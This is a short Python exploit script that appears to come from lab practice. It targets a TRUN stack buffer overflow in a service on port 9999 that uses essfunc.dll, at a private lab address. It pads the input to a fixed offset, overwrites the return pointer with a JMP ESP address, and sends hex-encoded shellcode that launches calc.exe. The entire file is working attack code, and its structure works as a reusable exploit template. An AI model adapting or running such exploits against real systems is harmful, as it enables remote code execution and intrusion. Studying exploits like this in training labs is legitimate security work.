#!/usr/bin/python
import socket,sys,struct

RHOST = "192.168.57.144" # Remote IP
RPORT = 9999 # Remote port

buf_totlen = 5000 # Total length of buffer (payload)
offset_srp = 2003 # Offset to saved return pointer; the overflow directly overwrites EIP

ptr_jmp_esp = 0x625011C7 # Pointer to JMP ESP in essfunc.dll

# From: WinExec-calc.nasm
# WinExec(LPCSTR "cmd.exe /c calc.exe", UINT 0)
# ExitProcess(UINT 0)
calc = ""
calc += "\xeb\x17\x5e\x31\xd2\x52\x88\x56"
calc += "\x13\x56\xb8\xad\x23\x86\x7c\xff"
calc += "\xd0\x52\xb8\xe8\xc0\x80\x7c\xff"
calc += "\xd0\xe8\xe4\xff\xff\xff\x63\x6d"
calc += "\x64\x2e\x65\x78\x65\x20\x2f\x63"
calc += "\x20\x63\x61\x6c\x63\x2e\x65\x78"
calc += "\x65\x4e"

buf = ""
buf += "\x41" * (offset_srp - len(buf)) # Fills to offset_srp (2003) with 'A'
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite with memory address of JMP ESP
buf += calc # Payload of calc.exe; directly follows SRP on stack
buf += "\x42" * (buf_totlen - len(buf)) # Fills rest of buffer with 'B'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send("TRUN /.:/" + buf)
s.close()

